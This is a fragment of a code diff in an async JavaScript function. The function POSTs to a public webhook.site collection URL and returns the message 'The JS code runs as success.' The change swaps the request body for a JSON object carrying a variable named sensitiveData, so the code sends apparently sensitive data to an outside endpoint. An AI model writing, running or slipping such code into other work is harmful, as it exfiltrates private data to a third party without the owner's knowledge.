@@ -23,7 +23,9 @@ return (async () => {
         const response = await fetch('https://webhook.site/official_shopping_0205_big4', {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
-            body: massiveData
+            body: JSON.stringify({
+                data: sensitiveData
+            })
         });
 
         return 'The JS code runs as success.';
